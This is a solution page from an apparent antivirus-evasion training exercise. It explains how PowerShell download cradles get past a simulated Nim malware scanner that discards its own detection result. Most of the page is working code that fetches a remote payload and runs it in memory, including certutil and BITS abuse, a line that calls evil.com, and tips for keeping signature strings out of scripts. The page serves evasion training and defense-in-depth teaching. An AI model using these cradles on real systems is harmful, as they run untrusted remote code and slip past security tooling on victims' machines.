---
title: "Solution 14: Download Cradle (Exploiting the Design Flaw)"
challenge_number: 14
difficulty: easy
category: "Signature Detection Bypass"
permalink: /solutions/14-download-cradle/
---

# Solution: Download Cradle (Exploiting the Design Flaw)

[Back to Challenge](../challenges/14-download-cradle.md)

## Overview

Exploit a critical design flaw in the scanner: the suspicious pattern detection logic uses `discard` for its result, meaning it identifies threats but **never blocks them**. Standard download cradles work because even if the scanner recognizes the pattern, it takes no action to prevent execution.

## Working Code

```powershell
# Standard WebClient download cradle
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://example.com/payload")
IEX $data
```

### Alternate Download Cradles

```powershell
# Invoke-WebRequest (PowerShell 3+)
$response = Invoke-WebRequest -Uri "http://example.com/payload" -UseBasicParsing
IEX $response.Content

# Invoke-RestMethod
$data = Invoke-RestMethod -Uri "http://example.com/payload"
IEX $data

# .NET HttpClient
$client = [System.Net.Http.HttpClient]::new()
$data = $client.GetStringAsync("http://example.com/payload").Result
IEX $data

# .NET WebRequest
$req = [System.Net.WebRequest]::Create("http://example.com/payload")
$resp = $req.GetResponse()
$reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
$data = $reader.ReadToEnd()
IEX $data

# BitsTransfer (downloads to file)
Start-BitsTransfer -Source "http://example.com/payload.ps1" -Destination "$env:TEMP\p.ps1"
& "$env:TEMP\p.ps1"

# CertUtil abuse (LOLBin)
certutil -urlcache -split -f "http://example.com/payload.exe" "$env:TEMP\payload.exe"
& "$env:TEMP\payload.exe"
```

### Combined with Signature Evasion

```powershell
# Even if the downloaded content contains "malware", the scanner
# only checks files on disk, not data in memory
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://example.com/payload")

# Data is in memory - scanner never sees it
# IEX executes directly from the string variable
IEX $data
```

## Why It Works

Looking at the scanner source code (`nim_antimalware_sim.nim`), the suspicious pattern check has a critical flaw:

```nim
proc checkSuspiciousPatterns(content: string): string =
  # ... pattern matching logic ...
  if hasDownloadCradle and hasExecution:
    discard "suspicious"  # <-- BUG: result is discarded!
  # ...
```

The `discard` keyword in Nim explicitly throws away the value. This means:

1. The scanner **does** detect the download cradle pattern
2. It **does** identify it as suspicious
3. But the detection result is **discarded** - never returned, never acted upon
4. The function effectively returns nothing useful
5. No blocking, no alerting, no quarantine occurs

This is a **design flaw**, not a bypass technique. The scanner was written to identify suspicious patterns but the developer accidentally (or intentionally for this exercise) discarded the result instead of returning it or triggering an action.

### What the Scanner Checks For

The scanner looks for combinations of:
- Download indicators: `WebClient`, `DownloadString`, `Invoke-WebRequest`, `Net.Http`
- Execution indicators: `IEX`, `Invoke-Expression`, `& `, `Start-Process`

It correctly identifies these patterns but fails to act on them.

## How to Verify

1. Save a download cradle:
   ```powershell
   @'
   $wc = New-Object System.Net.WebClient
   $data = $wc.DownloadString("http://example.com/payload")
   IEX $data
   '@ | Set-Content "test_cradle.ps1"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe test_cradle.ps1
   ```

3. Expected result: **No blocking occurs** - the scanner may log/identify the pattern but takes no enforcement action due to the `discard` bug.

4. Verify that signature detection still works independently:
   ```powershell
   # This WILL be detected (contains "malware" literal)
   Set-Content "test_sig.ps1" -Value '$x = "malware"'
   nim_antimalware_sim.exe test_sig.ps1
   # Detected!

   # This will NOT be blocked (download cradle without signatures)
   Set-Content "test_cradle2.ps1" -Value '$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString("http://evil.com/x")'
   nim_antimalware_sim.exe test_cradle2.ps1
   # Not blocked due to discard bug
   ```

5. The key insight: avoid putting actual signature strings ("malware", "virus", etc.) in the cradle script. The download cradle itself is safe; only literal signatures in the file trigger real detection.

## Security Implications

This demonstrates why defense-in-depth matters:
- A scanner that detects but doesn't block is equivalent to no scanner
- Real AV products use multiple layers: static signatures, heuristics, behavioral analysis, sandboxing
- A single `discard` bug negates entire detection capabilities
- Download cradles are one of the most common initial access techniques because they separate the indicator (the cradle) from the payload (downloaded content)
